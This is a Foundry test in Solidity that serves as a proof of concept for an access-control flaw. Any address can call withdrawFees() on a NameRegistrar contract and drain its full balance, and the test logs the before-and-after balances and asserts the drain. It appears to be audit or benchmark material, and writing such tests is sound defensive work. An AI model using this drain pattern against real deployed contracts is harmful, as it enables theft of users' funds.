// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/name_registrar.sol";

contract NameRegistrarTest is Test {
    NameRegistrar public nameRegistrar;
    address exploiter = makeAddr("exploiter");
    uint256 constant CONTRACT_BALANCE = 1 ether;

    function setUp() public {
        nameRegistrar = new NameRegistrar();
        vm.deal(address(nameRegistrar), CONTRACT_BALANCE);
    }

    function testArbitraryWithdrawal() public {
        // BEFORE: Record initial state
        uint256 contractBalanceBefore = address(nameRegistrar).balance;
        uint256 exploiterBalanceBefore = exploiter.balance;
        
        console.log("--- BEFORE Trigger ---");
        console.log("Contract balance:", contractBalanceBefore);
        console.log("Exploiter balance:", exploiterBalanceBefore);
        
        console.log("--- TRIGGER: exploiter.withdrawFees() ---");
        // Perform the exploit action
        vm.prank(exploiter);
        nameRegistrar.withdrawFees();

        // AFTER: Record state after exploit
        uint256 contractBalanceAfter = address(nameRegistrar).balance;
        uint256 exploiterBalanceAfter = exploiter.balance;
        
        console.log("\n--- AFTER Trigger ---");
        console.log("Contract balance:", contractBalanceAfter);
        console.log("Exploiter balance:", exploiterBalanceAfter);
        
        // Calculate and verify state changes
        uint256 contractBalanceDifference = contractBalanceBefore - contractBalanceAfter;
        uint256 exploiterBalanceDifference = exploiterBalanceAfter - exploiterBalanceBefore;
        bool fundsTransferred = (exploiterBalanceDifference == CONTRACT_BALANCE);
        bool contractDrained = (contractBalanceAfter == 0);
        
        console.log("\n--- DIFFERENTIAL VERIFICATION ---");
        console.log("Contract loss:  ", contractBalanceDifference);
        console.log("Exploiter gain: ", exploiterBalanceDifference);
        console.log("\nVERDICT:");
        
        // Final vulnerability verdict
        if (fundsTransferred && contractDrained) {
            console.log("Vulnerability Exists: Arbitrary address successfully drained contract funds");
        } else {
            console.log("Vulnerability not Exist: Contract funds were not transferred as expected");
        }

        // Original assertions
        assertEq(exploiterBalanceAfter, exploiterBalanceBefore + CONTRACT_BALANCE);
        assertEq(contractBalanceAfter, 0);
    }
}